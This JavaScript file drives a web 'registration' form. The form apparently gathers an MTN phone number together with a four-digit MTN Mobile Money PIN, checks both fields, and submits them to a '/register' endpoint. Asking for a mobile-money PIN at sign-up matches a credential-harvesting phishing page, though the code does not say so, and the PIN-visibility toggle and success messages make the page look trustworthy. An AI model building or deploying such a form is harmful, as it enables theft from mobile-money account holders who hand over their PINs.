document.addEventListener('DOMContentLoaded', function() {
    const form = document.getElementById('registrationForm');
    const messageContainer = document.getElementById('messageContainer');
    const submitBtn = document.getElementById('submitBtn');
    
    // Input validation
    const mtnInput = document.getElementById('mtnNumber');
    const pinInput = document.getElementById('momoPin');
    
    // Format MTN number (allow spaces and plus sign)
    mtnInput.addEventListener('input', function(e) {
        this.value = this.value.replace(/[^\d\s\+]/g, '');
    });
    
    // Only allow digits for PIN
    pinInput.addEventListener('input', function(e) {
        this.value = this.value.replace(/\D/g, '');
    });
    
    // Real-time validation feedback
    mtnInput.addEventListener('blur', function() {
        const value = this.value.replace(/[\s\+]/g, '');
        if (value.length > 0 && value.length < 10) {
            showMessage('MTN number must be at least 10 digits', 'error');
        }
    });
    
    pinInput.addEventListener('blur', function() {
        if (this.value.length > 0 && this.value.length !== 4) {
            showMessage('PIN must be exactly 4 digits', 'error');
        }
    });
    
    // Form submission
    form.addEventListener('submit', async function(e) {
        e.preventDefault();
        
        // Disable submit button
        submitBtn.disabled = true;
        submitBtn.textContent = 'REGISTERING...';
        
        // Clear previous messages
        hideMessage();
        
        const formData = new FormData(form);
        
        try {
            const response = await fetch('/register', {
                method: 'POST',
                body: formData
            });
            
            const data = await response.json();
            
            if (data.success) {
                showMessage(data.message, 'success');
                form.reset();
                
                setTimeout(() => {
                    hideMessage();
                }, 5000);
            } else {
                showMessage(data.message, 'error');
            }
        } catch (error) {
            console.error('Error:', error);
            showMessage('An error occurred. Please try again.', 'error');
        } finally {
            submitBtn.disabled = false;
            submitBtn.textContent = 'REGISTER';
        }
    });
});

// Show message function
function showMessage(message, type) {
    const container = document.getElementById('messageContainer');
    container.textContent = message;
    container.className = 'message-container ' + type;
    container.style.display = 'block';
    
    clearTimeout(window.messageTimeout);
    window.messageTimeout = setTimeout(() => {
        hideMessage();
    }, 8000);
}

// Hide message function
function hideMessage() {
    const container = document.getElementById('messageContainer');
    container.style.display = 'none';
    container.className = 'message-container';
    clearTimeout(window.messageTimeout);
}

// Toggle PIN visibility
function togglePinVisibility() {
    const pinInput = document.getElementById('momoPin');
    const toggleBtn = document.querySelector('.toggle-pin');
    
    if (pinInput.type === 'password') {
        pinInput.type = 'text';
        toggleBtn.textContent = '🙈';
    } else {
        pinInput.type = 'password';
        toggleBtn.textContent = '👁️';
    }
}